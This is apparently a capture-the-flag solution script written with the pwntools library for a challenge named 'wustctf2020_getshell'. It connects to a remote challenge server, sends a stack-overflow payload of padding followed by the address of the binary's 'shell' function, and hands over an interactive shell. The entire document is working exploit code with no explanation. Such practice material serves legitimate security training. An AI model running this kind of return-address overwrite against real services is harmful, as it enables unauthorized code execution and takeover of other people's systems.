from pwn import *

proc_name = './wustctf2020_getshell'

#p = process(proc_name)
p = remote('node4.buuoj.cn', 29910)
elf = ELF(proc_name)

shell = elf.sym['shell']

payload = b'a' * ( 0x18 + 4 ) + p32(shell)

p.sendafter('\n', payload)

p.interactive()
